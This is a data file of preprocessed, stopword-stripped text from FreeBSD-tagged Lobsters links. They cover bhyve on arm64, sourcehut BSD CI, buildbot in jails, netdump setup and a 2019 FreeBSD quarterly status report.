220,Lobsters,freebsd,FreeBSD,bhyvearm64: CPU and Memory Virtualization on Armv8.0-A,https://papers.freebsd.org/2019/bsdcan/elisei-bhyvearm64_cpu_and_memory_virtualization_on_armv8.0_a/,cpu memory virtualization,cpu memory virtualization alexandru elisei,cpu memory virtualization alexandru elisei alexandruelisei gmailcom bhyve hypervisor working porting architecture port called present current status project architecture hypervisor well used hardware feature designed virtualization provide guest abstracted view processor used third cpu execution mode exception level restrict guest memory region choosing used extra address translation step called stage translation virtualization allows host computer run multiple virtual machine family processor provides various hardware feature make virtualization efficient removing reducing overhead usually associated running virtual machine bhyve hypervisor originally created implement virtualization platform working porting bhyve architecture port called present current status hypervisor feature implemented used testing current limitation follows architecture bhyve us three user space program create run terminate virtual machine bhyveload bhyve bhyvectl respectively hypervisor implemented kernel module named vmm loaded runtime cpu two different execution mode called exception level separate nonprivileged user process kernel aid virtualization third exception level exception level added optional hardware extension execution mode provides needed separation guest host operating system hypervisor need control memory location guest virtual machine able access historically done emulating page table software incur significant hardware penalty reduce overhead arm implemented second stage address translation called stage translation part virtualization extension use feature isolate region memory made available virtual machine
221,Lobsters,freebsd,FreeBSD,Sourcehut makes BSD software better,https://sourcehut.org/blog/2019-09-12-sourcehut-makes-bsd-software-better/,sourcehut make bsd software better,programming language janet nim zig janet freebsd openbsd nim zig enduser software neovim mutt neovim bug freebsd port mutt display server wlroots sway wlroots dozen wayland compositor sway cage small project mrsh freebsd arch linux alpine linux samurai four operating system including free openbsd build manifest submit page compatibility page dispatchsrht hey get touch,every day sourcehut run continuous integration freebsd openbsd dozen project believe even use sourcehut distribution improving bsd software ecosystem important u platform designed embrace environment around rather building new walled garden make easy existing software project plug ci infastructure many bsd project take advantage improve software software foundational stuff improvement trickle entire bsd ecosystem let highlight great project take advantage bsd offering programming language janet nim zig several programming language use sourcehut run bsd testing janet language us sourcehut test freebsd openbsd fast build take minute newest language join u nim us buildssrht make sure every github pull request work correctly freebsd openbsd zig project long time friend sourcehut also using buildssrht test freebsd support host mailing list u stability programming language especially important bug compiler implementation affect software compiled thanks using sourcehut keep bsd support good shape guy enduser software neovim mutt enduser software get fun put stable bsd software closer fingertip neovim project fast moving modern fork venerable vim text editor us buildssrht openbsd testing working using help fix bug freebsd port similarly venerable mutt email client also experimenting sourcehut recently using buildssrht make sure mutt compiles freebsd alpine linux debian trying listssrht mailing list display server wlroots sway one project wlroots one first adopter sourcehut surprise also early adopter freebsd support use test dozen wayland compositor work well platform several test stack freebsd well sway project cage project project still using sourcehut test operating system well small project lot smaller project taking advantage sourcehut bsd tool make sure set right berkley friend start simon ser mrsh shell test freebsd arch linux alpine linux michael forney samurai project us sourcehut build test four operating system including free openbsd want try set build manifest image freebsdlatest openbsdlatest drop submit page give test drive need push halfbaked test commits done check compatibility page detail buildssrht support bsd operating system check dispatchsrht add bsd ci github project hey netbsd expert need help finish netbsd support buildssrht get touch
222,Lobsters,freebsd,FreeBSD,Setting up buildbot in FreeBSD jails,https://andidog.de/blog/2018-04-22-buildbot-setup-freebsd-jails,setting buildbot freebsd jail,jail recommended practice ssh manpage,jail cheap way semantically securitywise separate application group later want move buildbot worker component clone easiest worker nothing else jail begin installing ezjail popular stable wrapper around freebsd jail functionality make creation administration jail much easier sudo pkg install ezjail create directory structure base jail ie extract base freebsd system usrjailsbasejail sudo ezjailadmin install time actually create jail since master offer web ui worker talk master need ip address assigned simplicity choose localonly address network jail networking several gotchas one loopback address handled namely accessing ip address inside jail connection end jailhost loopback interface else jail could access parent service security hole kernel rewrite connection first address assigned jail first assigned ip address public service jail listens port suddenly publically accessible therefore recommended practice separate network interface jail could even one per jail tutorial want jail communicate directly work cloning new interface add separate network interface jail create cloned interface automatically happens next boot well need repeat step sudo sysrc sudo service netif cloneup assign ip server jailhost well needed tutorial jailhost jail communicate serve buildbot web user interface nginx later sudo sysrc inet netmask set default network interface jail explicitly configured sudo sysrc start ezjail configured jail boot sudo sysrc ezjailenableyes actually create jail sudo ezjailadmin create f example master sudo ezjailadmin create f example start ezjailmanaged jail also happen reboot ezjailenableyes please ignore warning perjail configuration via jail variable obsolete ezjail simply changed yet use another mechanism sudo ezjailadmin start jail successfully started something useful like installing package inside want internet access within jail least decide use official source pkgfreebsdorg purpose set nat networking rule using one freebsd builtin firewall rather package filter pf sudo tee etcpfconf eof extif external network interface adapt hardwarenetwork needed jailif interface chose communication jail allow jail access internet via nat avoid nat within network jail communicate nat extif jailif network jailif network nat extif jailif network extif note two rule split clarity equivalent oneliner nat extif jailif network jailif network extif restriction jail network set skip jailif common recommended pf rule exactly related article set skip block drop pas extif nt lock ssh pas extif proto tcp extif port allow web access pas extif proto tcp extif port eof check firewall rule syntax sudo service pf onecheck sudo sysrc pfenableyes sudo service pf start mind must escaped shell land etcpfconf unescaped point ssh connection stall drop time firewall state existing connection drop hanging terminal press enter one another understand keyboard shortcut close ssh session please read escape character ssh manpage please reconnect vm vagrant ssh check internet connection work fetch http examplecom copy resolvconf every jail allow resolving hostnames note typically added default ezjail flavor sudo tee usrjailsmasteretcresolvconf etcresolvconf sudo tee etcresolvconf check internet connection work jail sudo jexec master fetch http examplecom
223,Lobsters,freebsd,FreeBSD,2019 State of the Hardened Union,https://github.com/lattera/presentations/blob/master/vBSDcon/2019/2019%20-%20State%20of%20the%20Hardened%20Union.pdf,state hardened union,permalink join github today sign reload reload reload,permalink dismiss join github today github home million developer working together host review code manage project build software together sign retrieve contributor time sorry something went wrong reload sorry display file sorry file invalid displayed perform action time signed another tab window reload refresh session signed another tab window reload refresh session
224,Lobsters,freebsd,FreeBSD,How to configure a network dump in FreeBSD?,https://oshogbo.vexillium.org/blog/68/,configure network dump freebsd,bibliography,network dump might useful collecting kernel crash dump embedded machine machine larger amount ram available swap partition size besides net dump also try compress core dump however often may still enough swap keep whole core dump situation using network dump convenient reliable way collecting kernel dump first let talk little bit history first implementation network dump implemented around freebsd kernel module code implemented intention part freebsd however code never landed freebsd finally commit mark johnston netdump client code landed freebsd subsequently many commitment implemented add support different driver example first official release freebsd support netdump freebsd let get back main topic configure network dump two machine needed one machine collect core dump let call server use second one send u core dump client configure client use dumpon command dumpon index r v k pubkey zz g gateway server c client iface allows u configure ip address server option ip used send package c option necessary also provide getaway time also encrypt core dump may useful want send unencrypted kernel memory network smart approach basic configuration configure server client interface want send core dumpdumpon c straightforward need client side serverside install additional port netdumpd pkg install netdumpd run netdumpd additional privilege use user create special user responsible collecting core dump please remember keep core dump safe place user access use simple command run netdump netdumpd networkdumps command run netdump debug mode option option describes directory new core dump stored need make sure netdumpd store pid file stored pid file varrunnetdumppid default changed p option also use option bind one given address option provide script executed core dump received wait core dump freebsd may take ok instead simulate core dump machine client run command force core dump sysctl overwriting mbuf zone pointersnetdump progress searching server netdumping dumping mb netdump finished debugkdbpanic allows u enforce panic machine console see netdump sent server see core dump received as well empty bound file client new dump client kdh completed dump client core dump stored hostname client machine use kgdb analyze situation cd networkdumps gdb pathtokernelkernel gdb gdb gdb freebsd copyright c free software foundation inclicense gnu gpl version later http gnuorglicensesgplhtml free software free change redistribute itthere warranty extent permitted lawtype show copying show warranty detailsthis gdb configured type show configuration configuration detailsfor bug reporting instruction please see http wwwgnuorgsoftwaregdbbugs find gdb manual documentation resource online http wwwgnuorgsoftwaregdbdocumentation help type help type apropos word search command related word reading symbol debugging symbol found pathtokernelkernel schedswitch kgdb net dump powerful straightforward configure feature allows u collect full memory dump network end day worth noticing currently freebsd netdumps work use udp protocol developer decided use udp protocol much simpler tcpip besides also easier implement require allocation case panic want manipulate virtual memory subsystem may available future may changed bibliographythe history future core dump freebsd sam w gwydir asiabsdcon netdump hardware support performance iflib sam w gwydir asiabsdcon
225,Lobsters,freebsd,FreeBSD,FreeBSD core team appoints a WG to explore transitioning from Subversion to Git,https://www.freebsd.org/news/status/report-2019-04-2019-06.html#FreeBSD-Core-Team,freebsd core team appoints wg explore transitioning subversion git,introduction administration page jenkinsadmin freebsdorg lwhsu freebsdorg fcp ci policy devsummit http core freebsdorg presentation survey result meetbsd talk topic deb freebsdfoundationorg election continue increase support freebsd partnership program alpha preview freebsdtesting monthly newsletter http wwwfreebsdfoundationorgjournal event attended upcoming event freebsdorg zeising freebsdorg http gitterimfreebsddesktoplobby http githubcomfreebsddesktop irc freebsdorg portmgrsecretary freebsdorg portmgr freebsdorg freebsdorg gmailcom dariusmihaim gmailcom mihai freebsdorg gmailcom dariusmihaim gmailcom mihai freebsdorg dougm freebsdorg alc freebsdorg markj freebsdorg mk semihalfcom mba semihalfcom mw semihalfcom bz freebsdorg asomers freebsdorg buggy markj freebsdorg andrew freebsdorg tuexen freebsdorg emaste freebsdorg ota jemailnejp trasz freebsdorg http cifreebsdorg kib freebsdorg kib freebsdorg freebsddrivers mellanoxcom mellanox socket direct adapter bluefield multicore system chip soc mellanox ofed freebsd documentation rmacklem freebsdorg jeff freebsdorg gallatin freebsdorg markj freebsdorg mst semihalfcom mindal semihalfcom mw semihalfcom broadcom soc series mw semihalfcom ar semihalfcom nxp soc mmuenz gmailcom gmailcom marcel freebsdorg araujo freebsdorg mihai freebsdorg alfonsosiciliano emailcom news home status home,introductionthis quarter report includes interesting topic easily accessible anyone even programmer report link presentation freebsd survey result bsdcan describe interesting experience hackaton might encourage host one possibly participant also provide date information status irc channelsfor technical skill give news role git freebsd project describe status tool hunt bug enhance security announce clone sysctlfinally experienced programming probably interested great work done driver particular aknowledgement due alan somers started bring date fuse implementation year behind important improvement include userfriendly experience trackpoints touchpads enabled default much low level work graphic many new bhyve feature update linux compatibility layer various kernel improvementshave nice read lorenzo salvadoreentries various official semiofficial team found administration page contact jenkins admin jenkinsadmin freebsdorg contact liwen hsu lwhsu freebsdorg freebsd ci team maintains continuous integration system related task freebsd project ci system regularly check committed change successfully built performs various test analysis result result build job archived artifact server testing debugging need ci team member examine failing build unstable test work expert area fix code adjust test infrastructure detail effort available weekly ci report fcp ci policy feedback state please provide comment freebsdtesting suitable list testing working group devsummit please see freebsdtesting related ticket information work progress fixing failing test case build adding drm port building test current adding test job http implementing automatic test bare metal hardware extending publishing embedded testbed planning running ztest network stack test help software get ci freebsd hosted ci solution contact freebsd core team core freebsdorg freebsd core team governing body freebsd core approved source commit bit doug moore dougm chuck silver chs brandon bergren bdragon vendor commit bit scott phillips scottph annual developer survey closed developer took survey average completion time minute public survey closed taken user completion rate presentation survey result took place bsdcan core team voted appoint working group explore transitioning source code source truth subversion git core asked ed maste chair group ed researching topic time example ed gave meetbsd talk topic variety viewpoint within core regarding host git repository however core feel git prudent path forward project received many season doc submission picked top candidate google announce accepted technical writer project hoping lot new refreshed man page contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure provides resource improve security quality assurance release engineering effort publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter held annual board meeting ottawa may board director officer election take place year meeting justin gibbs elected new president board director new freebsd foundation board director includes president founder justin gibbs vice president benedict reuschling secretary philip paeps treasurer marshall kirk mckusick director hiroki sato george nevilleneil robert n watson read election election management team gave update board respective area discussed key area project need help step fill hole reviewed updated month goal identified project support discussed conference likely attend went latest fundraising effort followed discussion get user contribute back project discussing increase number user contributor talked method making training material available partnership commercial user support help facilitate collaboration commercial user freebsd developer also meet company discus need bring information back project ed maste deb goodkin met commercial user germany beneficial also help u understand application freebsd used bsdcan brings high number commercial user excellent opportunity similar discussion need fourday freebsd summit bsdcan fundraising effort work funded donation grateful generous donation intel netapp vmware stormshield last quarter working hard get commercial user give back help u continue work supporting freebsd importantly like thank individual donor making donation last quarter total please consider making donation help u continue increase support freebsd also partnership program provide benefit larger commercial donor find information link share company o improvement foundation improves freebsd operating system employing technical staff maintain improve critical kernel subsystem add feature functionality fix problem foundation also provides grant fund individual project commits freebsd base system repository sponsored foundation quarter include improvement tmpfs inmemory msdos ufs filesystems device driver hardware compatibility fix virtual memory vm tool chain documentation testing continuous integration improvement fixed number race condition security issue found syzkaller google codecoverageguided system call fuzzer alan somers work updating freebsd support fuse userspace filesystems continued quarter full detail elsewhere quarterly report point work committed project branch bug fix improvement committed directly freebsd development branch edward napierala linuxulator project continued quarter resulting number improvement linuxulator linuxspecific functionality linsysfs work part path supporting linux strace debugging tool order facilitate debugging failure linux binary linuxulator mateusz guzik continued scalability performance improvement quarter bjoern zeeb integrated sdio stack detail elsewhere quarterly report progress made online raidz expansion project quarter matt ahrens posted alpha preview feature experimentation review freebsd foundation make alpha release image available testing near future foundation staff contributed nine freebsd security advisory erratum update quarter including cpu vulnerability workarounds related work included improving intel microcode update loading continuous integration quality assurance foundation provides fulltime staff member working improving automated testing continuous integration overall quality assurance effort second quarter foundation staff continued improve project ci infrastructure worked contributor fix failing build test case worked team project testing need hosted cifocused working group bsdcan continue publish ci weekly report freebsdtesting mailing list see freebsd ci section report information supporting freebsd infrastructure foundation provides hardware support improve freebsd infrastructure last quarter continued supporting freebsd hardware located around world freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project check advocacy education work last quarter represented freebsd linuxfest northwest bellingham washington sponsored helped organize freebsd developer summit bsdcan ottawa canada sponsored attended bsdcan set registration attended vienna freebsd security hackathon vienna austria represented freebsd hkoscon attended berlin freebsd developer summit presented comcast lab connect open source conference sponsored presented represented freebsd rootconf bangalore india committed attend oscon thing open committed sponsor help organize bay area developer summit provided freebsd advocacy material provided travel grant freebsd contributor attend many event continued producing freebsd advocacy material help people promote freebsd around world read conference adventure conference recap trip report monthly newsletter help educate world freebsd publishing professionally produced freebsd journal mentioned previously freebsd journal free publication find access latest issue http wwwfreebsdfoundationorgjournal find event attended upcoming event continued work new website developer help u improve website work begun make easier community member find information easily make site efficient legalfreebsd ip foundation owns freebsd trademark responsibility protect also provide legal support core team investigate question arise go http wwwfreebsdfoundationorg find support freebsd help contact freebsd graphic team freebsdorg contact niclas zeising zeising freebsdorg freebsd team maintains lower level freebsd graphic stack includes graphic driver graphic library mesa opengl implementation xorg xserver related library application wayland related library application last report half year ago several update change made freebsd graphic stack improve user experience improve input device handling evdev enabled default configuration late building enabled ibmlenovo trackpoints elantech synaptics touchpads default well input device library libinput updated last series update bringing userland input stack date work started made several improvement drm kernel driver longstanding memory leak intel driver fixed several update improvement made various drm kernel driver component port drm kernel driver using linux kernel source created committed freebsd port graphicsdrmdevelkmod driver requires recent linux kpi available recent version freebsd current version driver contains several development improvement generic drm drmko driver well driver unloaded reloaded ease development testing cause issue virtual console however ssh connection recommended aid debugging use debugfs improved still limitation preventing fully functional since debugfs based pseudofs possible prevent fully functional debugfs current state might look adding required functionality pseudofs use another framework new inkernel drm driver virtualbox vboxvideoko ported linux support currently experimental work progress example virtual console wo nt update loading driver x waylandbased compositor working mesa updated switched using use port default version llvm currently several userland xorg driver application library updated improvement various userland component make graphic stack made also continued regularly scheduled biweekly meeting although work remains sending timely meeting minute afterwards people interested helping find u freebsdorg mailing list gitter chat http gitterimfreebsddesktoplobby also available freebsdxorg efnet also team area github work repository found http githubcomfreebsddesktop contact irc admin irc freebsdorg freebsd irc admin team manages freebsd project presence activity freenode irc network looking registration management channel within official namespace freebsd channel moderation liaising freenode staff allocating freebsd hostmask cloak user general user support relating channel management freebsd project currently endorse irc official support channel see able guarantee consistent positive user experience irc admin working toward creating high quality experience standardising channel administration moderation expectation ensuring project ability manage channel within namespace last quarter irc admin cleaned deregistered registration channel defunct stale date founder inactive seen year channel found otherwise active retained freebsd channel registered previous total documented baseline configuration setting wiki channel including chanserv setting channel mode registration policy etc established multiple documented method reporting user abuse channel issue irc admin resolution upcoming change work existing freebsd channel standardise channel management setting access migrate forward andor consolidate existing duplicate freebsd channel channel standard naming convention work unofficial freebsd channel migrate official freebsd channel suitable update existing ircrelated website documentation source describe official state project managed irc presence freenode lastly repeat previous call vast majority broader user community interacts freenode irc network freebsd developer presence still need significantly improved freenode many opportunity increasing amount quality interaction freebsd user developer term developer keeping finger pulse community encouraging cultivating greater contribution project long term critical strong developer presence amongst user irc admin would like call developer join freebsd freenode channel increase presence user invited join freebsdirc freenode irc network question idea constructive criticism feedback freebsd project improve service experience provides community irc contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg following done last quarter portmgr keep thing port tree going last quarter number port rose end quarter open pr commits excluding quarterly branch committers show slight decrease activity compared previous quarter people come go last quarter welcomed pedro giffuni pfg piotr kubaj pkubaj han petter selasky hselasky pedro han petter already active src committers said goodbye gordon kan tobez wosch infrastructure side new usescabal introduced various default version updated mysql python ruby samba julia gained default version web browser also updated firefox chromium last quarter antoine ran total expruns test various package update bump stack protector level strong switch default python version opposed remove sysdirh base deprecated year convert go port usesgo contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing second quarter freebsd release engineering team started cycle code slush starting may throughout cycle three beta build three rc build line originallypublished schedule final rc build started june final release build targeted july freebsd fourth release branch building stability reliability freebsd release engineering team also published schedule targeted start september one important thing note regarding published schedule excludes hard freeze branch test run eliminating code freeze entirely release cycle commits branch still require explicit approval release engineering team however additionally throughout quarter several development snapshot build released head branch much work sponsored freebsd foundation rubicon communication llc netgate project span multiple category kernel userspace port collection external project contact elena mihailescu gmailcom contact darius mihai dariusmihaim gmailcom contact mihai carabas mihai freebsdorg migration feature us saverestore feature migrate bhyve guest freebsd host another freebsd host migrate bhyve guest one need start empty guest destination host shared guest image using bhyve tool r option followed source host ip port listen migration request source host migration started executing bhyvectl command migrate migratelive option followed destination host ip port send message new feature added clear dirty bit migration round extend live migration highmem segment future task refactor live migration branch rebase live migration extend live migration unwired memory project sponsored matthew groom contact elena mihailescu gmailcom contact darius mihai dariusmihaim gmailcom contact mihai carabas mihai freebsdorg saverestore bhyve feature suspend resume facility added hypervisor bhyve bhyvectl tool used save guest state three file file guest memory file state various device state cpu another one metadata used restore process suspend bhyve guest bhyvectl tool must run suspend statefilename option followed guest name restore bhyve guest checkpoint one simply add r option followed main state file file given suspend option bhyvectl starting vm new feature added open ticket phabricator apply feedback received community future task add suspendresume support nvme add suspendresume support virtioconsole add suspendresume support virtioscsi add tsc offsetting restore amd cpu project sponsored matthew groom contact doug moore dougm freebsdorg contact alan cox alc freebsdorg contact mark johnston markj freebsdorg ongoing project aim teach swap pager send scsi unmap ata trim command swap device block swap space freed example application owning block exiting ssds become commonplace feature low latency random io request make appealing use swap device since lower latency mean application spend le time blocked waiting pagein swap device maximize write performance ssds require operating system send notification disk sector longer use help disk optimize usage nand flash cell freebsd notification called biodelete freebsd ufs zfs filesystems long time able transmit biodelete request device backing filesystem example ufs support enabled specifying newfs tunefs parameter however freebsd historically corresponding implementation swap device thanks doug moore current swapon send biodelete block specified device immediately prior configuring swap device enabled specifying e swapon parameter adding trimonce option swap device etcfstab entry inprogress work swap pager implement online block deletion biodelete transmitted block freed application hopefully implemented freebsd contact michal krawczyk mk semihalfcom contact maciej bielski mba semihalfcom contact marcin wojtas mw semihalfcom ena elastic network adapter smart nic available virtualized environment amazon web service aws ena driver support multiple transmit receive queue handle gb network traffic depending instance type used development freebsd similar linux dpdk since last update internal review improvement patch done followed validation various aws instance completed since last update upstream patch revision introduce major driver upgrade version along various fix improvement significant feature llq low latency queue independent queue reconfiguration using sysctl command implement netmap support ena todo internal review upstream netmap support project sponsored amazoncom inc contact bjoern zeeb bz freebsdorg sdio interface designed extension sd card allow attachment various peripheral eg wifi bluetooth work ongoing ilya bakulin mmccam stack provide infrastructure able sd card sdio device attached sidebyside facilitating freebsd cam framework based excellent work last year sdio support finished earlier year committed freebsd head intention merge later time facilitating newly available sdio bus work started port broadcom fullmac wifi driver work still progress expected complete later year wifi support raspberry pi embedded board become available likewise driver sdio device developed project sponsored freebsd foundation contact alan somers asomers freebsdorg fuse file system userspace allows userspace program implement file system widely used support outoftree file system like ntfs well exotic pseudo file system like sshfs freebsd fuse driver added gsoc project since time largely neglected fuse software buggy outofdate implementation year behind nearly finished fuse overhaul begain raised protocol level fixed many bug see added following feature optional kernelside permission check defaultpermissions implement vopmknod vopbmap vopadvlock allow interrupting fuse operation support named pipe unixdomain socket fusefs file system forward utimenow utimensat daemon kqueue support devfuse allow updating mount mount u allow exporting fusefs file system nfs serverinitiated invalidation name cache data cache respect rlimitfsize try support server old protocol also added following performance enhancement implement fuse fopenkeepcache fuseasyncread flag cache file attribute cache lookup entry positive negative serverselectable cache mode writethrough writeback uncached write clustering readahead use counter statistical reporting remains finish merging branch deal newly introduced bug project sponsored freebsd foundation contact mark johnston markj freebsdorg contact andrew turner andrew freebsdorg contact michael tuexen tuexen freebsdorg contact ed maste emaste freebsdorg see syzkaller entry quarterly report introduction syzkaller syzkaller continues find freebsd kernel bug number bug fixed past quarter continue investigate fix bug report syzkaller work extend syzkaller capabilites progressed andrew turner implemented support fuzzing compatibility layer kernel helping illuminate darker corner kernel possible use bhyve vm backend syzkaller efficient convenient fuzz freebsd freebsd planned work includes enabling use zfs base filesystem fuzzer vms extending range system call ioctls covered syzkaller enabling llvm sanitizers kernel catch issue making use netdump capture kernel dump panic found syzkaller making much easier diagnose bug syzkaller unable find reproducible test case project sponsored freebsd foundation contact yoshihiro ota ota jemailnejp kernel zlib upgrade progress xin delphij working closely zlib upgrade relocated contribzlib syscontribzlib order kernel code access zlib tree also deleted dead code depended zlib inflate inflate fork unzip uncompress gzip file also renamed crch avoid conflict zlibcrch next goal compile old zlib new zlib kernel allowing switch zlib user independently contact edward tomasz napierala trasz freebsdorg project aim improve linux compatibility layer make compatible recent linux release also lower bar potential developer want start contributing initial effort focused tooling make easier debug problem prevent future regression first part involved making possible use linux strace utility providing package reason freebsd truss ktrace trace linux binary decode linuxspecific flag structure second part involved providing linux test project binary linuxltp package ongoing work hook freebsd ci infrastructure http cifreebsdorg also number improvement fix bug discovered process one yet committed fix binary linked newer version libc effectively unbreaking binary recent ubuntu release project sponsored freebsd foundation contact konstantin belousov kib freebsdorg virtual memory machinedependent layer pmap need track mapping managed physical memory page able either destroy pageout change writeable readonly eg sync page content file without racing modification user writes mapping accounted creating pventry record address space implicitly linking pv entry pmap virtual address mapping previous work split lock protecting pv entry list vm lock pvhgloballock lock global address space see pmapc still later hashed perpage pv list lock introduced would reduce contention pv list maninulations different page unfortunately pvhgloballock still needed guarantee safety operation problem arises pmap us pmap lock protect page table tlb consistency perpmap lock different pv list lock updating page table entry never drop pmap lock necessary tlb invalidation done globally including signalling cpu ipi pv list lock unlocked necessary invalidation done instance pmap asked remove mapping specific page pmapremoveall check pv list page find mapping list might appear empty despite cpu tlb yet invalidated page reused cpu might change content using cached tlb entry allowing mean allowing silent data corruption opening security hole global pvh lock held pmaps invalidated tlbs mechanism obvious scalability issue instead generationcount based scheme handling delayed invalidation di developed thread might remove entry pv list acquired generation number marked page see pmapdelayedinvlpage eg pmapremoveall pmapremovewrite pmap code wait maximum current thread invalidation generation number pas page generation guarantee required tlb invalidation done original implementation di allowed get rid pvhgloballock used private mutex handle sequential queueing coming leaving thread protecting bounded region problem appeared eg scalability benchmark massive parallel unmaps causing thread contend di queueing current implementation di switched lockless queue algorithm using approach proposed tl harris relying doublecas coalesce generation count queueing us ifuncs select either previous locked di current lockless implementation old amd athlons implemented instruction fall locked implementation default lockless implementation still block waiting thread turnstile avoid priorityinversion issue practically wait occur rare typical parallel buildworld generates singledigit number event patch got lot testing peter holm continuous review mark johnston worked bug livelock problem implementation additional testing mateusz guzik helped identify priority inversion bug wait project sponsored freebsd foundation contact konstantin belousov kib freebsdorg execve family syscalls replaces executing image current process file containing program text data arbitrary preinitialized segment newly activated image usually called text file freebsd mark text file mark mutually exclusive opening file write word file opened write executed text file opened write execve syscall processing kernel need lock text file vnode done satisfy vfs call protocol ensure incompatible parallel change occuring text vnode vnode locked either exclusive mode mutually incompatible lock acquisition shared mode incompatible exclusive request allows shared owner principle reason would execve need exclusive vnode lock since modify neither content metadata text vnode exception marking vnode text done using vvtext flag vvflag protected vnode lock since modify vvflag vnode lock protecting modification taken exclusive end result execve file serialized instance user run parallel build executes one job compiling invocation compiler serialized execve count open write contained struct vnode member named vwritecount protected vnode lock well since text mutually exclusive open write reused vwritecount indicate text reference negative vwritecount count number text reference vwritecount content literally protected vnode interlock normally mutators also vnode lock least shared mode way longer need acquire exclusive text vnode lock execve removing serializing point additional positive effect started account precise number text reference vnode cleared vvtext last unmap text vnode potentially allowing obscure do mapping text file executed prevented writes mapping destroyed mark mapping text explicitly vmmapentry dereference vwritecount entry unmapped project sponsored freebsd foundation contact slava shwartsman han petter selasky konstantin belousov freebsddrivers mellanoxcom driver provides support lx ex dx adapter card driver provides support ethernet adapter card whereas driver provides support infiniband adapter rdma converged ethernet roce following update done driver ethernet added support mellanox socket direct adapter allows among rest capability run pcie gen lag interface support bluefield multicore system chip added support rshim driver bluefield multicore system chip soc rshim driver provides access rshim resource bluefield target accessible external host machine current rshim version provides device file boot image push virtual console access also creates virtual network interface connect bluefield target provides access internal rshim register firmware burning diagnostics tool added mstflint port package contains burning diagnostic tool mellanox nics package contains following tool mstflint tool allows query burn firmware mstconfig tool query set nonvolatile configurable option mellanox hcas mstregdump utility dump hardware register mellanox hardware mstmcra debug utility readswrites tofrom device configuration register space mstvpd utility dump oncard vpd upstream pushed upstream mfced driver detail content update found mellanox ofed freebsd documentation page general update submitted paper eurobsdcon joint talk netflix titled kernel tl tl hardware offload paper accepted mellanox intensively working improve cooperation freebsd community part effort freebsd user invited propose feature enhancement develop enrich enduser experience addition mellanox continues identify present right solution meet customer need project sponsored mellanox technology contact rick macklem rmacklem freebsdorg newer minor version made set optional operationsfeatures majority operation related posix operation posixfadvise posixfallocate lseek support seekholeseekdata also copy operation allows byte range file copied another file locally nfs server avoiding data transfer wire direction freebsdcurrent linux compatible copyfilerange syscall invoke copy operation mount also support mac labelling requires change rpcsecgss implementation add support may happen soon implementation progressing nicely time layouterror ioadvise allocate copy operation implemented still work done copy add asynchronous support large copy result long delay rpc reply major operation implemented next seek lseek seekholeseekdata work mount hoped implementation ready freebsdcurrenthead time release testing always appreciated done downloading modified kernel svn repository building testing couple recent freebsdcurrent system anyone conversant kerberos want take challenge adding support kernel rpc patch would also greatly appreciated contact jeff roberson jeff freebsdorg contact andrew gallatin gallatin freebsdorg contact mark johnston markj freebsdorg set patch improve state numa awareness freebsd kernel developed refined work also aim generally improve performance freebsd memory management subsystem system many cpu freebsd featured number large change improve performance system nonuniform memory architecture system memory access latency given address varies depending cpu another round improvement developed soon available freebsdcurrent short description patch follow already committed freebsdcurrent freebsd terminology memory page whose content may evicted referred wired page may wired different circumstance instance kernel memory wired userland application may request range memory wired using mlock mlockall system call freebsd historically defined systemwide limit number wired page avoid deadlock may arise much system memory reclaimed satisfy new memory allocation limit applied userland wiring request kernel wiring counted limit large source kernel wiring could cause mlock failure occurs frequently large zfs arc example freebsdcurrent limit changed userland wiring counted limit kernel contains number mechanism apply backpressure kernel memory usage use global limit wiring provide much benefit fix common problem large zfs system help enable architectural improvement code manages page wiring freebsd historically maintained two separate reference counter structure describes single physical page memory counter initially quite different property time become similar work merge two counter landed freebsdcurrent uservisible effect simplifies page management code remove large amount code existed solely transform reference one type code also made use heavily contended lock simplification improved kernel scalability workload enabled scalability improvement uma slab allocator used freebsd kernel backend service virtually dynamic memory allocation performed kernel first round numa improvement added numa awareness keg layer uma allocates manages slab however frontend uma provides several layer caching object provide domainaware caching time cache would become polluted object different memory domain however caching layer modified ensure object different memory domain partitioned helping ensure consumer perform domainlocal allocation free efficiently enable global firsttouch allocation policy umamanaged object boot freebsd kernel allocates number static data structure track physical memory structure historically lived lowest available range physical memory many inhabit numa domain memory track suboptimal one try affinitize workload particular numa domain executing workload kernel frequently access page structure local memory page structure placed local memory kernel perform many remote memory access inprogress work platform creates multiple array page tracking structure one per numa domain ensures array local domain complicates task initializing kernel data structure boot substantially reduce amount crossdomain communication occurs kernel performing useful work similarly patch affinitize percpu structure developed percpu memory allocation already return cpulocal memory structure allocated boot yet properly placed respect accessing cpu memory domain project sponsored netflixupdating platformspecific feature bringing support new hardware platform contact michal stanek mst semihalfcom contact kornel duleba mindal semihalfcom contact marcin wojtas mw semihalfcom semihalf team continued working freebsd support broadcom soc series quadcore communication processor targeted networking application router gateway control plane processing na completed since last update iproc pcie root complex internal external bus fix improvement including adding quirk driver bnxt ethernet support sysdevbnxtc driver extended support variant iflib made work without io cache coherency progress crypto engine acceleration ipsec offloading todo upstreaming work work expected submittedmerged head second half project sponsored juniper network inc contact marcin wojtas mw semihalfcom contact artur rojek ar semihalfcom semihalf team initiated working freebsd support nxp soc quadcore processor integrated packet processing acceleration high speed peripheral including gb ethernet pcie sata usb wide range networking storage security industrial application already completed platform base support rampup multiuser smp operation uart sata progress todo ethernet support gpio qspi upstreaming developed feature work expected submittedmerged head project sponsored alstom groupmany project build upon freebsd incorporate component freebsd project project may interest broader freebsd community sometimes include brief update submitted project quarterly report freebsd project make representation accuracy veracity claim submission bsdcam cambridge last year discussion create template hackathon way template devsummits test idea convinced swear tricked correct word host hackathon aberdeen project think benefit lot hackathons take little organisation worst part dealing getting money attendee pay event spoke deb goodkin foundation bsdcam arranged use new eventbrite based system handle 